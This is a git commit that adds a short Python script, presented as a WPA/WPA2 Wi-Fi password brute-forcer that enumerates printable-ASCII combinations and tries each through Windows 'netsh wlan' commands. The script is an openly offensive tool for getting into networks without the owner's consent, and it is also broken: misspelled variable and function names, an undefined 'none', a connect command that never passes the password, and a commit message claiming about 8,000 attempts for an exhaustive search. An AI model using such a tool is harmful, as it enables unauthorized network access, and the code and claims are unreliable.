92f3c68646a7fab4759c84c31e907446b2f06714
Mr_duck <93455237+gustavorochaduck@users.noreply.github.com>
2024-11-19 21:02:22 +0100

    The Newer WPA/WPA2 Brute Force
    This Project will create a wordlist from the ACSSII Base and will try to make almost 8.000 Attempts, Because WPA/WPA2 Can use 63 characters in the password and all common letters and sinbols is almost 126
    
    Co-Authored-By: VinaReis <181508168+vinareis@users.noreply.github.com>

---
+++ Python/brute force wifi/bruwi.py
@@ -0,0 +1,30 @@
+import os
+import string
+import itertools
+
+def algorythm():
+    ascii_chars = string.printable.strip()
+
+    for length in range(1, 65):
+        for combination in itertools.product(ascii_chars, repeat=length):
+            password = ''.join(cobination)
+            print(f'Password Brute Force: {password}')
+
+            if conect_wifi_windows(network_name, password):
+                print(f'The Password of {network_name} is {password}')
+                return password
+                
+    print('Something is Wrong!!!')
+    return none
+def conect_wifi_windows(ssid, password):
+    
+    conect = os.system(f'netsh wlan conect name={ssid} password=')
+def visible_wifi_windows():
+    search_result = os.popen("netsh wlan show networks").read()
+    print(f'Wifi Seracg Result:')
+    print(serach_result)
+
+
+network_name = input('Digit the name of the Network: ')
+
+conected_wifi_windows(network_name, password)
